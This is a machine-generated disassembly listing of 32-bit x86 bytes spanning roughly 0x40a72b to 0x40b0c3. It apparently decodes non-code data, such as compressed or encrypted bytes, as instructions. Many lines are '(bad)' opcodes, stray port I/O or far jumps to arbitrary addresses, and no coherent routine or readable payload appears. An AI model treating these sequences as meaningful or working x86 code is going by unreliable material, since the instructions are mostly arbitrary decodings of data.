  40a72b:	xor    ch,BYTE PTR [ebx+0x28]
  40a72e:	push   cs
  40a72f:	xor    dh,BYTE PTR [edx]
  40a731:	and    al,0x46
  40a733:	sub    eax,0x3347b2f
	...
  40a758:	std    
  40a759:	fld    st(0)
  40a75b:	xchg   esp,eax
  40a75c:	loop   0x40a72c
  40a75e:	ffree  st(5)
  40a760:	in     al,dx
  40a761:	rcr    BYTE PTR [ecx+edx*8-0x352a2fd6],1
  40a768:	sbb    cl,BYTE PTR [ebx+0x3d80000]
  40a76e:	push   ds
  40a76f:	or     BYTE PTR [esi],al
  40a771:	sbb    dl,BYTE PTR [edx]
  40a773:	pop    ds
  40a774:	neg    BYTE PTR [edx]
  40a776:	add    bl,BYTE PTR [esi]
  40a778:	loopne 0x40a781
  40a77a:	adc    al,BYTE PTR [edx+eax*1]
  40a77d:	sbb    cl,BYTE PTR ds:0x918e607
  40a783:	add    BYTE PTR [ebx],dl
  40a785:	sbb    al,0x34
  40a787:	and    ebp,DWORD PTR [ebp+0xd34372b]
  40a78d:	xor    esp,DWORD PTR [edi]
  40a78f:	xor    eax,0x2f3834ab
  40a794:	test   eax,0xb4352436
  40a799:	add    al,BYTE PTR [eax]
  40a79b:	add    BYTE PTR [ebx-0x45],dh
  40a79e:	aam    0xc3
  40a7a0:	jge    0x40a773
  40a7a2:	fcom   st(4)
  40a7a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7a5:	out    0xda,al
  40a7a7:	aad    0xa3
  40a7a9:	(bad)  
  40a7ab:	leave  
  40a7ac:	xchg   ebp,eax
  40a7ad:	test   esi,0xfffc36c4
  40a7b3:	call   FWORD PTR [ebp-0x4]
  40a7b6:	sbb    cl,BYTE PTR ds:0x14f5060d
	...
  40a7d8:	add    BYTE PTR [eax],al
  40a7da:	add    ebx,DWORD PTR [eax]
  40a7dc:	add    BYTE PTR [edi],dl
  40a7de:	std    
  40a7df:	xor    esp,ebp
  40a7e1:	add    BYTE PTR [ebx],ah
  40a7e3:	and    DWORD PTR [ebx],eax
  40a7e5:	add    BYTE PTR ds:0xad75a245,cl
  40a7eb:	bound  esp,QWORD PTR [esp+eiz*2+0x74a866b7]
  40a7f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7f3:	ja     0x40a787
  40a7f5:	jnp    0x40a78f
  40a7f7:	sub    BYTE PTR [ebx],al
  40a7f9:	add    BYTE PTR ds:0x25fe2a15,cl
  40a7ff:	jmp    0xff11:0xe5ffed2c
  40a806:	add    BYTE PTR [esi],dl
  40a808:	push   ss
  40a809:	add    BYTE PTR ds:0x11a061f,cl
  40a80f:	add    eax,0x28151dfb
  40a814:	(bad)  
  40a815:	daa    
  40a816:	or     DWORD PTR [ebx],edx
  40a818:	clc    
  40a819:	sbb    edx,DWORD PTR [ecx]
  40a81b:	pop    ds
  40a81c:	add    eax,DWORD PTR [eax]
  40a81e:	or     eax,0x496996bf
  40a823:	in     eax,dx
  40a824:	stos   BYTE PTR es:[edi],al
  40a825:	ins    DWORD PTR es:[edi],dx
  40a826:	inc    ebp
  40a827:	fmul   DWORD PTR [esi-0x7044d3a9]
  40a82d:	push   DWORD PTR [edx-0x2c2fbf97]
  40a833:	xor    DWORD PTR [esi+ebx*8],0xffffffc2
  40a837:	push   ebx
  40a838:	cs fmul st,st(2)
  40a83b:	jnp    0x40a888
  40a83d:	fadd   QWORD PTR [eax]
	...
  40a85b:	add    BYTE PTR [eax+0xdc0334f],bh
  40a861:	pop    es
  40a862:	lahf   
  40a863:	jno    0x40a84e
  40a865:	fcom   QWORD PTR [edx-0x6ff30785]
  40a86b:	jns    0x40a84d
  40a86d:	jmp    FWORD PTR [esi-0x175a176a]
  40a873:	add    ecx,DWORD PTR ds:0x44373200
  40a879:	xor    eax,0x443d4554
  40a87e:	sub    al,0x31
  40a880:	pop    ebp
  40a881:	inc    eax
  40a882:	jmp    0xa740b58a
  40a887:	int3   
  40a888:	(bad)  
  40a889:	leave  
  40a88a:	enter  0xdcb1,0xb8
  40a88e:	les    ebp,FWORD PTR [edi+0x6143ffc3]
  40a894:	pop    edx
  40a895:	pop    edi
  40a896:	bound  edx,QWORD PTR [esi+ebx*2+0x5c]
  40a89a:	cmp    eax,0xe962586a
  40a89f:	add    ecx,DWORD PTR ds:0x41f1e700
  40a8a5:	sti    
  40a8a6:	jecxz  0x40a8b2
  40a8a8:	psubusb mm3,mm3
  40a8ab:	hlt    
  40a8ac:	add    ecx,DWORD PTR [eax]
  40a8ae:	add    bl,bh
  40a8b0:	pop    ss
  40a8b1:	add    BYTE PTR [edi-0x7ba57fae],al
  40a8b7:	imul   ebp,DWORD PTR [edi-0x5c987f89],0x6c8e6b
	...
  40a8dd:	add    BYTE PTR [edx+0x7b617e57],al
  40a8e3:	pop    edi
  40a8e4:	jmp    0x7740b5ec
  40a8e9:	pop    edx
  40a8ea:	outs   dx,DWORD PTR ds:[esi]
  40a8eb:	xchg   DWORD PTR [ecx+0x5f],esp
  40a8ee:	jae    0x40a950
  40a8f0:	push   esp
  40a8f1:	push   ecx
  40a8f2:	pop    ecx
  40a8f3:	pop    ecx
  40a8f4:	push   edx
  40a8f5:	addr16 nop
  40a8f7:	push   ebp
  40a8f8:	inc    ebx
  40a8f9:	pusha  
  40a8fa:	imul   ebp,DWORD PTR [eax+0x4c],0xa1000d04
  40a901:	xor    BYTE PTR [ecx+0x1d],dl
  40a904:	add    BYTE PTR [edi-0x6d32b83c],bl
  40a90a:	cmp    bh,BYTE PTR [edx]
  40a90c:	aam    0x3c
  40a90e:	int3   
  40a90f:	sub    cl,dl
  40a911:	sub    ah,BYTE PTR [ecx]
  40a913:	inc    edi
  40a914:	retf   
  40a915:	sub    eax,edi
  40a917:	(bad)  
  40a918:	jmp    DWORD PTR [edx-0x2d]
  40a91b:	jne    0x40a8d1
  40a91d:	ja     0x40a8b2
  40a91f:	dec    esi
  40a920:	popf   
  40a921:	fs xchg ebp,eax
  40a923:	adc    BYTE PTR [ebp+0x1168],0x64
  40a92a:	xchg   BYTE PTR [esi-0x45],ch
  40a92d:	push   0x7281558e
  40a932:	xchg   edi,eax
  40a933:	(bad)  
  40a934:	(bad)  
  40a935:	jmp    0xf97d964b
  40a93a:	add    al,0x6
  40a93c:	or     bl,ah
  40a93e:	add    cl,BYTE PTR [edx]
  40a940:	push   es
  40a941:	call   0x40a946
	...
  40a95e:	add    BYTE PTR [eax],al
  40a960:	push   cs
  40a961:	add    BYTE PTR [eax],al
  40a963:	pusha  
  40a964:	jge    0x40a9bd
  40a966:	xchg   edi,eax
  40a967:	data16 mov es,WORD PTR [ebx+0xe838e]
  40a96e:	add    BYTE PTR [edx+0x7b],cl
  40a971:	mov    al,0x7b
  40a973:	dec    ecx
  40a974:	jne    0x40a90b
  40a976:	outs   dx,BYTE PTR ds:[esi]
  40a977:	inc    edx
  40a978:	jg     0x40a915
  40a97a:	jmp    DWORD PTR [edi-0x6126cafb]
  40a980:	add    BYTE PTR [edi+ebp*8],dh
  40a983:	mov    al,ds:0x96d12cfd
  40a988:	dec    eax
  40a989:	sub    al,0x0
  40a98b:	clc    
  40a98c:	stos   DWORD PTR es:[edi],eax
  40a98d:	in     al,dx
  40a98e:	push   ss
  40a98f:	stc    
  40a990:	mov    al,0xef
  40a992:	push   DWORD PTR [edx-0x6031b71d]
  40a998:	out    dx,al
  40a999:	jne    0x40a968
  40a99b:	add    BYTE PTR [ecx-0x1b12405e],ah
  40a9a1:	xchg   edx,eax
  40a9a2:	test   bl,al
  40a9a4:	cli    
  40a9a5:	jns    0x40a942
  40a9a7:	cwde   
  40a9a8:	pushf  
  40a9a9:	lock mov DWORD PTR [esi-0x2d731e17],ebx
  40a9b0:	aaa    
  40a9b1:	retf   
  40a9b2:	(bad)  
  40a9b3:	dec    DWORD PTR [esi+0x64aaaab9]
  40a9b9:	(bad)  
  40a9ba:	(bad)  
  40a9bb:	call   DWORD PTR [esi*1+0x2a0c2431]
  40a9c2:	cmp    DWORD PTR [esi],esp
	...
  40a9e0:	add    BYTE PTR [eax],al
  40a9e2:	ja     0x40aa1a
  40a9e4:	cmp    esp,DWORD PTR es:[edi+edi*8]
  40a9e8:	(bad)  
  40a9e9:	dec    DWORD PTR [edi]
  40a9eb:	push   cs
  40a9ec:	imul   ebp,DWORD PTR [ebx-0x79],0x21ffff24
  40a9f3:	pop    ss
  40a9f4:	push   ss
  40a9f5:	pop    es
  40a9f6:	and    al,0xff
  40a9f8:	(bad)  
  40a9f9:	(bad)  
  40a9fa:	ds jecxz 0x40a9c4
  40a9fd:	stos   BYTE PTR es:[edi],al
  40a9fe:	hlt    
  40a9ff:	(bad)  
  40aa00:	(bad)  
  40aa01:	inc    DWORD PTR [esp+ebp*8]
  40aa04:	in     al,0xe0
  40aa06:	in     al,0xfe
  40aa08:	(bad)  
  40aa09:	jmp    FWORD PTR [ebx-0x44]
  40aa0c:	out    dx,al
  40aa0d:	loop   0x40a9b6
  40aa0f:	xlat   BYTE PTR ds:[ebx]
  40aa10:	rol    bh,0xa3
  40aa13:	out    0xfa,eax
  40aa15:	(bad)  
  40aa16:	xchg   esp,eax
  40aa17:	int3   
  40aa18:	fcomp  st(6)
  40aa1a:	stos   BYTE PTR es:[edi],al
  40aa1b:	ror    esi,1
  40aa1d:	iret   
  40aa1e:	mov    ah,0xfe
  40aa20:	(bad)  
  40aa21:	call   FWORD PTR [eax+0x5ea2ac7a]
  40aa27:	xchg   BYTE PTR [ebx+0x3322e000],al
  40aa2d:	cmp    dh,BYTE PTR [eax+0xd191b0d]
  40aa33:	sbb    esi,ebp
  40aa35:	push   es
  40aa36:	cmp    eax,0xd000329
  40aa3b:	loop   0x40aa30
  40aa3d:	cmp    DWORD PTR ds:[eax*1-0x2bac8ea],ebp
  40aa45:	add    al,0x0
	...
  40aa63:	add    BYTE PTR [ecx],al
  40aa65:	sub    DWORD PTR [ebx],eax
  40aa67:	add    BYTE PTR ds:0x2d2d0554,cl
  40aa6d:	sbb    BYTE PTR [edx],cl
  40aa6f:	add    bh,bh
  40aa71:	push   ds
  40aa72:	add    eax,DWORD PTR [eax]
  40aa74:	or     eax,0xaf52ec73
  40aa79:	inc    edx
  40aa7a:	rol    BYTE PTR [edi],1
  40aa7c:	and    ebp,DWORD PTR [edx+ecx*1]
  40aa7f:	adc    edx,edi
  40aa81:	popa   
  40aa82:	(bad)  
  40aa83:	adc    eax,0x5c0282d3
  40aa88:	push   ss
  40aa89:	je     0x40aa25
  40aa8b:	daa    
  40aa8c:	adc    cl,BYTE PTR [ebx]
  40aa8e:	add    ebx,DWORD PTR [edi]
  40aa90:	cld    
  40aa91:	push   cs
  40aa92:	test   BYTE PTR [esi-0x47],0x92
  40aa96:	retf   
  40aa97:	inc    edx
  40aa98:	dec    esp
  40aa99:	sbb    ah,dl
  40aa9b:	cmp    eax,0x32e04b42
  40aaa0:	xor    DWORD PTR [eax+ebp*4+0x3783a5f],ecx
  40aaa7:	add    BYTE PTR ds:0xa59b5d1c,cl
  40aaad:	jb     0x40ab04
  40aaaf:	stos   DWORD PTR es:[edi],eax
  40aab0:	pushf  
  40aab1:	adc    DWORD PTR [esp+edi*4],0xffffff9f
  40aab5:	jo     0x40ab0a
  40aab7:	in     al,dx
  40aab8:	ret    0x4d2c
  40aabb:	rcl    BYTE PTR [ebx+0x73af6348],0x7b
  40aac2:	push   cs
  40aac3:	loop   0x40aa70
  40aac5:	mov    al,BYTE PTR [ecx+0x0]
	...
  40aae4:	add    BYTE PTR [eax],al
  40aae6:	or     eax,0xf6d9d000
  40aaeb:	out    0xc7,al
  40aaed:	int    0xfd
  40aaef:	repz icebp 
  40aaf1:	repnz jecxz 0x40aac3
  40aaf4:	cli    
  40aaf5:	not    BYTE PTR [eax]
  40aaf7:	lock fucomip st,st(3)
  40aafa:	adc    BYTE PTR [ecx],0xeb
  40aafd:	in     al,0x2c
  40aaff:	loope  0x40aabb
  40ab01:	fstp   TBYTE PTR ds:0x2edee3f5
  40ab07:	jecxz  0x40aaf1
  40ab09:	add    ecx,DWORD PTR ds:0x2ed50100
  40ab0f:	fistp  DWORD PTR [eax]
  40ab11:	fistp  DWORD PTR [eax]
  40ab13:	in     eax,dx
  40ab14:	push   cs
  40ab15:	sar    edx,cl
  40ab17:	in     al,0xfd
  40ab19:	fild   WORD PTR [edx+0x11]
  40ab1c:	out    0xcc,eax
  40ab1e:	stc    
  40ab1f:	leave  
  40ab20:	repnz out 0xee,al
  40ab23:	mov    ebx,edx
  40ab25:	aam    0xf9
  40ab27:	shl    BYTE PTR [ebx-0x34371f0c],1
  40ab2d:	add    ecx,DWORD PTR ds:0x5e5a6100
  40ab33:	pop    eax
  40ab34:	push   ebp
  40ab35:	pusha  
  40ab36:	mov    bh,0x17
  40ab38:	arpl   WORD PTR [edx-0x3f],bx
  40ab3b:	push   edi
  40ab3c:	jmp    0xa840b844
  40ab41:	sti    
  40ab42:	pop    eax
  40ab43:	(bad)  
  40ab44:	call   0xaf40b84c
  40ab49:	pop    ss
	...
  40ab66:	add    BYTE PTR [eax],al
  40ab68:	out    0x1d,al
  40ab6a:	jmp    0x8d40b872
  40ab6f:	xchg   BYTE PTR [edi+0x79],dh
  40ab72:	ja     0x40abaa
  40ab74:	outs   dx,BYTE PTR ds:[esi]
  40ab75:	jo     0x40abd0
  40ab77:	jle    0x40ab86
  40ab79:	add    BYTE PTR [ecx],bl
  40ab7b:	lahf   
  40ab7c:	xor    ecx,DWORD PTR [edi+edi*8+0x60896438]
  40ab83:	push   ss
  40ab84:	aam    0xb0
  40ab86:	push   0x24
  40ab88:	outs   dx,BYTE PTR ds:[esi]
  40ab89:	xchg   edx,eax
  40ab8a:	bound  edx,QWORD PTR [edi+eiz*2]
  40ab8d:	ret    
  40ab8e:	inc    esi
  40ab8f:	pop    ss
  40ab90:	or     DWORD PTR [edi-0x28580286],0x88a6ff53
  40ab9a:	cmp    ecx,DWORD PTR [edi]
  40ab9c:	push   eax
  40ab9d:	mov    eax,0xee94b
  40aba2:	add    dh,dh
  40aba4:	test   al,0xd0
  40aba6:	push   edx
  40aba7:	mov    esi,0xd945c04e
  40abac:	scas   al,BYTE PTR es:[edi]
  40abad:	mov    ecx,0xb744b34b
  40abb2:	inc    ebx
  40abb3:	mov    ebx,0xa05fa64f
  40abb8:	jge    0x40ab64
  40abba:	pop    ebx
  40abbb:	mov    dl,0x4c
  40abbd:	bnd jno 0x40ab50
  40abc0:	jle    0x40ab6c
  40abc2:	jmp    FWORD PTR [edx]
  40abc4:	into   
  40abc5:	cmp    eax,0x2ee13bcf
  40abca:	fild   QWORD PTR [eax+0x0]
	...
  40abe9:	add    ah,dl
  40abeb:	js     0x40abb4
  40abed:	and    ecx,esp
  40abef:	inc    ecx
  40abf0:	iret   
  40abf1:	sub    eax,0xe9c42f54
  40abf6:	push   cs
  40abf7:	add    BYTE PTR [eax],al
  40abf9:	inc    esp
  40abfa:	jg     0x40ac68
  40abfc:	test   DWORD PTR [eax-0x77],ebp
  40abff:	xchg   ebp,ecx
  40ac01:	inc    esi
  40ac02:	js     0x40ac74
  40ac04:	xchg   ebx,eax
  40ac05:	push   0x5a
  40ac07:	ja     0x40ac09
  40ac09:	mov    ebx,0xdff21af7
  40ac0e:	cmc    
  40ac0f:	btc    DWORD PTR [ecx+0xe4272a],0x80
  40ac17:	in     al,0xdf
  40ac19:	mov    dl,0x9b
  40ac1b:	jmp    0xe4ed:0xe27de7eb
  40ac22:	gs call 0xc3acac27
  40ac28:	ret    
  40ac29:	iret   
  40ac2a:	addr16 fstp st(4)
  40ac2d:	(bad)
  40ac31:	iret   
  40ac32:	lock out 0xc2,eax
  40ac35:	les    esp,FWORD PTR [ebp-0x69212d36]
  40ac3b:	retf   0xcc
  40ac3e:	xlat   BYTE PTR ds:[ebx]
  40ac3f:	mov    esp,0x953abcb4
  40ac44:	mov    bl,0xb5
  40ac46:	js     0x40ac05
  40ac48:	scas   al,BYTE PTR es:[edi]
  40ac49:	scas   al,BYTE PTR es:[edi]
  40ac4a:	lea    esi,[edi+0xb5b3]
	...
  40ac6c:	xchg   DWORD PTR [edi-0x52365351],esp
  40ac72:	out    dx,al
  40ac73:	test   BYTE PTR [edi-0x405e5b5f],dl
  40ac79:	lahf   
  40ac7a:	stos   DWORD PTR es:[edi],eax
  40ac7b:	mov    ebx,0xae8786d7
  40ac80:	add    edi,DWORD PTR [ecx-0x53]
  40ac83:	fisubr WORD PTR [ebx-0x64706865]
  40ac89:	mov    cl,BYTE PTR [edx-0x110af800]
  40ac8f:	add    cl,cl
  40ac91:	push   ebp
  40ac92:	pop    ebp
  40ac93:	pop    edi
  40ac94:	lods   al,BYTE PTR ds:[esi]
  40ac95:	sub    bh,bh
  40ac97:	jmp    FWORD PTR [ecx+0x757d7574]
  40ac9d:	imul   ebp,DWORD PTR [esi+0x3d],0xffffff85
  40aca1:	jle    0x40ad20
  40aca3:	gs inc ebx
  40aca5:	push   0x2e4665f
  40acaa:	add    BYTE PTR [eax],al
  40acac:	or     eax,0x23acb05
  40acb1:	cs jmp 0x6045:0xbfe80d12
  40acb9:	call   0xef8e0283
  40acbe:	lds    esp,FWORD PTR [eax+0x37]
  40acc1:	frstor [ebx-0x5912d082]
  40acc7:	dec    ebx
  40acc8:	push   ebx
  40acc9:	(bad)  
  40acca:	mov    eax,0xb6cf3c47
  40accf:	inc    edi
	...
  40acec:	add    BYTE PTR [eax],al
  40acee:	add    eax,0x82ff9703
  40acf3:	mov    al,ds:0xc4a5a366
  40acf8:	push   eax
  40acf9:	mov    edx,0xa1619e65
  40acfe:	mov    ds:0x6db254c6,eax
  40ad03:	adc    DWORD PTR [ebp-0x4e],0xffffffa2
  40ad07:	sbb    BYTE PTR [ebx],al
  40ad09:	add    BYTE PTR ds:0xe940ee13,cl
  40ad0f:	push   eax
  40ad10:	add    eax,DWORD PTR [eax]
  40ad12:	or     eax,0x77a96775
  40ad17:	xchg   BYTE PTR [edi-0x60],cl
  40ad1a:	popa   
  40ad1b:	xchg   ecx,eax
  40ad1c:	gs mov dl,0x3a
  40ad1f:	and    DWORD PTR [esi-0x5a],0xd
  40ad23:	mov    esi,0x97768b79
  40ad28:	or     DWORD PTR [ecx-0x437e5e7c],0x9785a1b2
  40ad32:	nop
  40ad33:	loope  0x40ad8f
  40ad35:	xchg   esp,eax
  40ad36:	xchg   ebp,eax
  40ad37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad38:	imul   ecx,DWORD PTR [esi-0x48a05af3],0xaf45cc0d
  40ad42:	mov    bh,0x0
  40ad44:	fimul  WORD PTR [ecx]
  40ad46:	loopne 0x40ad48
  40ad48:	xor    esp,DWORD PTR [ebx+0x45a8851]
  40ad4e:	or     eax,0x677200
	...
  40ad6f:	add    BYTE PTR [ebp+0x66],ch
  40ad72:	(bad)  
  40ad73:	pop    edi
  40ad74:	jnp    0x40ad97
  40ad76:	ins    BYTE PTR es:[edi],dx
  40ad77:	pop    edx
  40ad78:	jg     0x40addc
  40ad7a:	jnp    0x40adda
  40ad7c:	jb     0x40add3
  40ad7e:	lods   eax,DWORD PTR ds:[esi]
  40ad7f:	imul   ebp,DWORD PTR [ebx+0x5d],0x5d
  40ad83:	push   ebp
  40ad84:	gs dec esi
  40ad86:	inc    edi
  40ad87:	setnp  BYTE PTR [esi+edx*2+0x4d]
  40ad8c:	les    ecx,FWORD PTR [edx+0x60]
  40ad8f:	ins    DWORD PTR es:[edi],dx
  40ad90:	pop    ecx
  40ad91:	and    esi,DWORD PTR [ecx+ecx*2-0x2502fff3]
  40ad98:	call   0x6af67429
  40ad9d:	or     eax,0x6e974b8a
  40ada2:	ins    BYTE PTR es:[edi],dx
  40ada3:	xor    eax,0x197b394a
  40ada8:	or     eax,0xbc96d800
  40adad:	mov    eax,ebp
  40adaf:	add    ecx,DWORD PTR ds:0x4a3b3500
  40adb5:	cmp    cl,ch
  40adb7:	add    ecx,DWORD PTR ds:0xcebdba00
  40adbd:	mov    ah,0x99
  40adbf:	(bad)  
  40adc0:	mov    esi,0xcfa79cc1
  40adc5:	mov    bh,0xbe
  40adc7:	shl    DWORD PTR [ecx+0x78c8bebf],0xa4
  40adce:	stos   DWORD PTR es:[edi],eax
  40adcf:	stos   BYTE PTR es:[edi],al
  40add0:	pop    esp
  40add1:	test   al,0xb5
  40add3:	mov    ecx,0x0
	...
  40adf0:	add    BYTE PTR [eax],al
  40adf2:	jo     0x40ad7c
  40adf4:	scas   eax,DWORD PTR es:[edi]
  40adf5:	mov    esi,0x86ffaa46
  40adfa:	test   DWORD PTR [eax-0x6287889b],esi
  40ae00:	addr16 dec edi
  40ae02:	mov    ds:0x716164c1,al
  40ae07:	mov    BYTE PTR [eax+0x5c],ah
  40ae0a:	jb     0x40adda
  40ae0c:	aas    
  40ae0d:	pop    eax
  40ae0e:	outs   dx,BYTE PTR ds:[esi]
  40ae0f:	sahf   
  40ae10:	jge    0x40ae51
  40ae12:	mov    edx,DWORD PTR [edi-0x6360d8ba]
  40ae18:	jns    0x40adf4
  40ae1a:	fcmovnb st,st(5)
  40ae1c:	adc    eax,0xee9
  40ae21:	pop    edx
  40ae22:	sub    dh,BYTE PTR [ebp-0x6e]
  40ae25:	cmp    DWORD PTR [ebx],0x67
  40ae28:	cwde   
  40ae29:	jp     0x40ae2c
  40ae2b:	ins    DWORD PTR es:[edi],dx
  40ae2c:	mov    cl,ch
  40ae2e:	push   cs
  40ae2f:	add    BYTE PTR [eax],al
  40ae31:	mov    WORD PTR [ecx],gs
  40ae33:	xor    al,cl
  40ae35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae36:	aas    
  40ae37:	inc    edx
  40ae38:	aam    0x8b
  40ae3a:	push   DWORD PTR [edx]
  40ae3c:	fisub  WORD PTR [ecx+0x29d63925]
  40ae42:	sbb    al,0x8
  40ae44:	in     al,dx
  40ae45:	sub    eax,0x29d34318
  40ae4a:	pop    es
  40ae4b:	sub    BYTE PTR [ebp-0x3ad803c2],cl
  40ae51:	inc    eax
  40ae52:	repnz push cs
  40ae54:	out    0x2f,eax
	...
  40ae72:	add    BYTE PTR [eax],al
  40ae74:	int3   
  40ae75:	and    eax,edi
  40ae77:	inc    ecx
  40ae78:	sbb    ecx,DWORD PTR ds:0xee9e4
  40ae7e:	add    BYTE PTR [esi],bl
  40ae80:	jmp    0xe32f:0xdf43d32e
  40ae87:	imul   edx,DWORD PTR [ecx],0x0
  40ae8a:	add    BYTE PTR [ebp+0x6799a8],bl
  40ae90:	test   DWORD PTR [esi+0x6a],esp
  40ae93:	add    BYTE PTR [ebx],ch
  40ae95:	imul   bh
  40ae97:	jecxz  0x40aeb4
  40ae99:	hlt    
  40ae9a:	fcomip st,st(6)
  40ae9c:	xor    al,0xd4
  40ae9e:	idiv   ah
  40aea0:	mov    esi,0xc6f4e8f5
  40aea5:	out    dx,al
  40aea6:	fxch   st(6)
  40aea8:	shl    dl,cl
  40aeaa:	out    0xf1,al
  40aeac:	(bad)  
  40aead:	out    0xf9,eax
  40aeaf:	scas   eax,DWORD PTR es:[edi]
  40aeb0:	sub    esi,0xc46fe7f9
  40aeb6:	rol    ch,cl
  40aeb8:	rcr    dh,1
  40aeba:	(bad)  
  40aebc:	adc    edx,0xffffffd6
  40aebf:	rcl    ebx,1
  40aec1:	cld    
  40aec2:	rcl    bh,cl
  40aec4:	push   esp
  40aec5:	mov    edi,0x3f1b00d3
  40aeca:	push   esi
  40aecb:	inc    ebp
  40aecc:	sub    BYTE PTR [edi],cl
  40aece:	popa   
  40aecf:	push   edx
  40aed0:	das    
  40aed1:	pop    esp
  40aed2:	(bad)  
  40aed3:	jmp    DWORD PTR [ebx+0xebf7f1]
	...
  40aef5:	add    BYTE PTR [ebx-0x53011809],dl
  40aefb:	xlat   BYTE PTR ds:[ebx]
  40aefc:	(bad)  
  40aefd:	hlt    
  40aefe:	(bad)  
  40aeff:	cld    
  40af00:	loopne 0x40aefe
  40af02:	mov    esi,0xdac6d1f5
  40af07:	stc    
  40af08:	out    dx,al
  40af09:	stc    
  40af0a:	into   
  40af0b:	fdivrp st(1),st
  40af0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af0e:	jmp    0x1830a108
  40af13:	int3   
  40af14:	fcmove st,st(5)
  40af16:	fdiv   st,st(2)
  40af18:	fcmovbe st,st(2)
  40af1a:	(bad)  
  40af1b:	(bad)  
  40af1c:	(bad)  
  40af1d:	dec    ebx
  40af1f:	sahf   
  40af20:	mov    ah,0xa3
  40af22:	popf   
  40af23:	mov    ds:0xb50db0a5,eax
  40af28:	psubd  mm0,mm6
  40af2b:	int3   
  40af2c:	push   edx
  40af2d:	stos   DWORD PTR es:[edi],eax
  40af2e:	stos   DWORD PTR es:[edi],eax
  40af2f:	mov    ecx,0xc6bfee51
  40af34:	fs mov dh,0x9c
  40af37:	rol    DWORD PTR [edi-0x1a],1
  40af3a:	lods   al,BYTE PTR ds:[esi]
  40af3b:	mov    bh,0x60
  40af3d:	test   eax,0x956f8598
  40af42:	mov    esi,0xddd6333e
  40af47:	lahf   
  40af48:	sub    al,0xd1
  40af4a:	iret   
  40af4b:	and    eax,0x998b8911
  40af50:	je     0x40af11
  40af52:	pushf  
  40af53:	mov    ah,0x85
  40af55:	sbb    al,0x60
  40af58:	jge    0x40aef4
	...
  40af76:	add    BYTE PTR [eax],al
  40af78:	mov    ebp,DWORD PTR [edi-0x5b857699]
  40af7e:	and    esp,esp
  40af80:	popf   
  40af81:	test   BYTE PTR [edi],ah
  40af83:	loope  0x40aff5
  40af85:	lods   al,BYTE PTR ds:[esi]
  40af86:	push   ds
  40af87:	stc    
  40af88:	sub    DWORD PTR [ebp+0x49],0xffffffb0
  40af8c:	mov    eax,0x81bb5dc5
  40af91:	pushf  
  40af92:	add    eax,DWORD PTR [eax]
  40af94:	or     eax,0x41ca2b71
  40af99:	xchg   edx,eax
  40af9a:	sub    ebx,ecx
  40af9c:	dec    edx
  40af9d:	aad    0x77
  40af9f:	test   DWORD PTR [ebp-0x1c],eax
  40afa2:	das    
  40afa3:	aam    0x58
  40afa5:	loope  0x40afd9
  40afa7:	xchg   ecx,eax
  40afa8:	pusha  
  40afa9:	shl    BYTE PTR [edx],cl
  40afab:	rcr    BYTE PTR [esi-0x18],1
  40afae:	ins    DWORD PTR es:[edi],dx
  40afaf:	aam    0x54
  40afb1:	jmp    0xe71c:0xe142da2e
  40afb8:	xor    bl,cl
  40afba:	and    al,0xe4
  40afbc:	adc    eax,0x6a5c4dff
  40afc1:	push   ecx
  40afc2:	push   ecx
  40afc3:	dec    edi
  40afc4:	fwait
  40afc5:	js     0x40afc8
  40afc7:	sbb    eax,DWORD PTR [edi]
  40afc9:	sbb    eax,0x9e41c27
  40afce:	cli    
  40afcf:	inc    edi
  40afd0:	mov    eax,0xf00d0a22
  40afd5:	or     eax,0x7bcc7167
  40afda:	fs jns 0x40afdd
	...
  40aff9:	add    BYTE PTR [edi-0x66826c98],al
  40afff:	jp     0x40b076
  40b001:	outs   dx,DWORD PTR ds:[esi]
  40b002:	xchg   edx,eax
  40b003:	jnp    0x40b068
  40b005:	jne    0x40afe3
  40b007:	imul   esi,DWORD PTR [edi+0x72],0xffffff9d
  40b00b:	ins    DWORD PTR es:[edi],dx
  40b00c:	pop    ecx
  40b00d:	sbb    al,0x26
  40b010:	cwde   
  40b011:	jno    0x40b092
  40b013:	push   0x77
  40b015:	pop    esp
  40b016:	stos   DWORD PTR es:[edi],eax
  40b017:	adc    esp,DWORD PTR [ebp+0x49475b45]
  40b01d:	push   ecx
  40b01e:	jne    0x40b072
  40b020:	pop    edx
  40b021:	pusha  
  40b022:	mov    al,0x16
  40b024:	xchg   esi,eax
  40b025:	pop    edx
  40b026:	(bad)  
  40b027:	dec    ebx
  40b028:	cmp    eax,0x555abf5d
  40b02d:	or     eax,0x494a51ad
  40b032:	cdq    
  40b033:	fs sub eax,0x25c0babd
  40b039:	mov    ebx,0xa7b4c0de
  40b03e:	int3   
  40b03f:	mov    ebp,0xc40ff7e9
  40b044:	mov    ah,0xb3
  40b046:	(bad)  
  40b047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b048:	clc    
  40b049:	push   es
  40b04a:	add    edx,eax
  40b04c:	test   al,0xc2
  40b04e:	fadd   st(3),st
  40b050:	into   
  40b051:	ret    
  40b052:	int    0xb0
  40b054:	inc    ecx
  40b056:	inc    edx
  40b057:	fdivr  QWORD PTR [ebp+edi*4+0x7b]
  40b05b:	mov    esi,DWORD PTR [edi-0x6b]
	...
  40b07a:	add    BYTE PTR [eax],al
  40b07c:	jle    0x40b009
  40b07e:	daa    
  40b07f:	xchg   edi,eax
  40b080:	mov    cl,0x8f
  40b082:	imul   ebp,DWORD PTR [ebx+0x7f7a92a0],0xffffffa1
  40b089:	xchg   ebx,eax
  40b08a:	jl     0x40b03f
  40b08c:	or     DWORD PTR [edx-0x34658a93],0xe80bec60
  40b096:	xor    bh,ah
  40b098:	or     al,0xf8
  40b09a:	push   cs
  40b09b:	cs xchg ecx,eax
  40b09d:	sar    edi,0xe8
  40b0a0:	ret    0x6f8
  40b0a3:	cmp    eax,0xdd738ecc
  40b0a8:	mov    ecx,0xd1307ea
  40b0ad:	add    edx,DWORD PTR [ebx]
  40b0af:	(bad)  
  40b0b0:	jbe    0x40b061
  40b0b2:	add    BYTE PTR [ecx],al
  40b0b4:	(bad)  
  40b0b5:	(bad)  
  40b0b6:	cmp    ecx,DWORD PTR [ecx]
  40b0b8:	(bad)
  40b0bb:	(bad)  [ebx+0x61ff27d3]
  40b0c1:	rcr    BYTE PTR [edi],cl
  40b0c3:	fst    DWORD PTR [ebx-0x2b]
